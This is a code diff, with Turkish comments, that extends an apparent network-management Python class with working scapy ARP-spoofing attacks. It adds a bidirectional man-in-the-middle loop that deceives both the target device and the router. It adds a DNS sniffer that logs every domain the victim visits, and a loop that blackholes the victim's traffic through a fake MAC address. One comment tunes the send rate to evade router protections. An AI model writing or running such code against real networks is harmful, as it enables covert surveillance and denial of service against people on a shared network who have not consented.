@@ -4,20 +4,113 @@ import threading
 import time
 import socket
 import nmap  # pip install python-nmap ile yüklediğin kütüphane
-from scapy.all import ARP, Ether, srp, send, sniff, IP
+from scapy.all import ARP, Ether, srp, send, sniff, IP, get_if_addr, conf, DNS, DNSQR, send
 from mac_vendor_lookup import MacLookup
 
 class NetworkManager:
     def __init__(self):
+        self.is_running = False # Genel çalışma durumu
         self.is_spoofing = False
         self.db_path = "known_devices.json"
         self.nm_scanner = nmap.PortScanner() # Nmap tarayıcısını başlat
         self.vendor_lookup = MacLookup()
         self.log_callback = None
+        self.is_monitoring = False # Yeni: Takip modu için
+        self.target_ip = None
         try:
             self.vendor_lookup.update_vendors() 
         except:
             pass
+
+    def _arp_loop(self, target_ip, gateway_ip, target_mac, delay):
+        """Genel ARP döngüsü. delay parametresi hızı belirler."""
+        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
+        
+        while self.is_running:
+            send(packet, verbose=False)
+            time.sleep(delay) # Burası artık dinamik!
+    
+    def packet_callback(self, packet):
+        """Hafifletilmiş ve daha hassas paket analizi."""
+        if not self.is_monitoring or not self.log_callback:
+            return
+
+        # SADECE DNS (UDP 53) SORGULARINA ODAKLAN
+        if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
+            try:
+                # DNS Sorgu kaydını al
+                qname = packet.getlayer(DNSQR).qname.decode('utf-8')
+                domain = qname.strip('.')
+                
+                # Gereksiz sistem/reklam sorgularını filtrele (Logu temiz tutar)
+                ignored_domains = ["google-analytics", "metrics", "gvt1", "apple-cloud", "msftncsi"]
+                if not any(x in domain for x in ignored_domains):
+                    self.log_callback(f"🌐 Ziyaret: {domain}")
+            except:
+                pass
+
+    def run_sniff(self):
+        """Sadece ilgili IP'nin DNS paketlerine odaklanır."""
+        # Port 53 DNS trafiğidir.
+        sniff_filter = f"udp port 53 and src host {self.target_ip}"
+        sniff(filter=sniff_filter, prn=self.packet_callback, store=0, iface=conf.iface, 
+              stop_filter=lambda x: not self.is_monitoring)
+
+    def start_monitoring(self, target_ip, gateway_ip, target_mac, log_cb):
+        """TAKİP MODU."""
+        self.stop_all() # Önce çalışan her şeyi durdur
+        self.is_running = True
+        self.is_monitoring = True
+        self.target_ip = target_ip
+        self.log_callback = log_cb
+        
+        # Sadece hedefin paketlerini bize yönlendirelim,
+        # modemin paketlerini hedefe yönlendirirsek (çift taraflı spoofing yapmazsak) asimetrik routing yüzünden internet yavaşlar/kopar.
+        # Bu yüzden çift taraflı (hem hedefi hem modemi kandıran) bir spoofing döngüsü kurmalıyız ki aracı olabilelim.
+        threading.Thread(target=self._full_arp_loop, 
+                         args=(target_ip, target_mac, gateway_ip, 2), 
+                         daemon=True).start()
+
+        # DNS Takibi için sniff başlat
+        threading.Thread(target=self.run_sniff, daemon=True).start()
+
+    def _full_arp_loop(self, target_ip, target_mac, gateway_ip, delay):
+        """Tam ARP döngüsü. Hem hedefi hem modemi kandırır ki trafik içimizden aksın."""
+        my_mac = Ether().src # Scapy otomatik kendi MAC imizi bulur
+        try:
+            # Modemin MAC adresini bulalım
+            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=gateway_ip), timeout=2, verbose=False)
+            gateway_mac = ans[0][1].hwsrc
+        except Exception:
+            # Bulunamazsa döngüye girme
+            return
+
+        # Hedefe giden paket (Ben modemim)
+        packet_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
+        # Modeme giden paket (Ben hedefim)
+        packet_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
+        
+        while self.is_running:
+            send(packet_target, verbose=False)
+            send(packet_gateway, verbose=False)
+            time.sleep(delay)
+
+    def sniff_traffic(self):
+        """Trafiği daha geniş bir filtreyle dinle."""
+        # Sadece DNS değil, hedeften gelen her türlü IP paketini yakalayalım (Test için)
+        sniff_filter = f"ip src {self.target_ip}" 
+        
+        print(f"Dinleme başladı: {self.target_ip} üzerinden...")
+        
+        sniff(filter=sniff_filter, 
+            prn=self.packet_callback, 
+            iface=conf.iface, # Aktif arayüzü zorla kullan
+            store=0, 
+            stop_filter=lambda x: not self.is_monitoring) 
+        
+    def stop_monitoring(self):
+        self.is_running = False
+        self.is_monitoring = False
 
     def get_custom_name(self, mac):
         """JSON dosyasından ismi güvenli bir şekilde okur."""
@@ -106,9 +199,9 @@ class NetworkManager:
         
         return devices
     
-    def packet_callback(self, packet):
+    def spoof_packet_callback(self, packet):
         """Hedef cihazdan gelen her paketi yakalar ve GUI'ye bildirir."""
-        if self.is_spoofing and self.log_callback:
+        if getattr(self, 'is_spoofing', False) and self.log_callback:
             # Eğer paket gelen IP, hedef IP ile eşleşiyorsa
             if packet.haslayer(IP) and packet[IP].src == self.target_ip:
                 self.log_callback(f"⚠️ Engellenen Cihaz ({self.target_ip}) veri göndermeye çalışıyor!")
@@ -116,25 +209,59 @@ class NetworkManager:
     def start_sniffing(self):
         """Ayrı bir thread'de paket dinlemeyi başlatır."""
         # Sadece hedef IP'den gelen paketleri filtrele (Performans için)
-        sniff(filter=f"host {self.target_ip}", prn=self.packet_callback, stop_filter=lambda x: not self.is_spoofing)
+        sniff(filter=f"host {self.target_ip}", prn=self.spoof_packet_callback, stop_filter=lambda x: not self.is_spoofing)
 
-    def spoof(self, target_ip, gateway_ip, target_mac):
+    def get_my_ip(self):
+        """Bilgisayarın o anki aktif ağ arayüzündeki IP'sini bulur."""
+        try:
+            return get_if_addr(conf.iface)
+        except:
+            # Alternatif yöntem: Eğer scapy bulamazsa standart socket kullan
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            ip = s.getsockname()[0]
+            s.close()
+            return ip
+
+    def safe_spoof(self, target_ip, gateway_ip, target_mac):
+        my_ip = self.get_my_ip()
+        
+        # Kendi IP'mizi kazara hedef almayalım
+        if target_ip == my_ip:
+            print("Hata: Kendi IP'nizi engelleyemezsiniz!")
+            return
+
+        # SADECE HEDEFE PAKET GÖNDER (Modeme dokunma)
+        # Bu paket: "Ben modemim (gateway_ip), paketleri bana (benim MAC adresime) at" der.
         packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
+        
         while self.is_spoofing:
             send(packet, verbose=False)
-            time.sleep(5)
+            # Sıklığı düşürelim (Router'ın koruma sistemine takılmamak için)
+            time.sleep(3)
 
     def start_disconnect(self, target_ip, gateway_ip, target_mac, log_cb):
+        """KESME MODU: Trafiği geçersiz bir MAC adresine yönlendirerek bloke eder."""
+        self.stop_all() # Önce çalışan her şeyi durdur
+        self.is_running = True
         self.target_ip = target_ip
-        self.is_spoofing = True
         self.log_callback = log_cb
-        self.thread = threading.Thread(target=self.spoof, args=(target_ip, gateway_ip, target_mac), daemon=True)
-        self.thread.start()
+        
+        # İnterneti tam anlamıyla koparmak için sahte MAC döngüsünü başlat
+        threading.Thread(target=self._block_arp_loop, args=(target_ip, gateway_ip, target_mac), daemon=True).start()
+        
+        # Kesme modunda da veri denemelerini izlemek için sniff başlatabilirsin
+        threading.Thread(target=self.run_sniff, daemon=True).start()
 
-        # ARP Spoofing Thread
-        threading.Thread(target=self.spoof, args=(target_ip, gateway_ip, target_mac), daemon=True).start()
-        # Paket Dinleme Thread (Canlı Log için)
-        threading.Thread(target=self.start_sniffing, daemon=True).start()
+    def _block_arp_loop(self, target_ip, gateway_ip, target_mac):
+        """Hedef cihazın paketlerini sahte bir MAC adresine (Kara Delik) yollar."""
+        fake_mac = "02:00:00:00:00:00"
+        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=fake_mac)
+        
+        while self.is_running:
+            send(packet, verbose=False)
+            time.sleep(1)
+
 
     def restore(self, target_ip, gateway_ip, target_mac, gateway_mac):
         """Ağı eski haline döndürür (Düzeltme paketleri gönderir)."""
@@ -147,4 +274,12 @@ class NetworkManager:
 
 
     def stop_disconnect(self):
+        self.is_running = False
+
+
+    def stop_all(self):
+        """Tüm işlemleri güvenli bir şekilde durdurur."""
+        self.is_running = False
+        self.is_monitoring = False
         self.is_spoofing = False
+        time.sleep(0.2) # Thread'lerin kapanması için kısa bir süre bekle
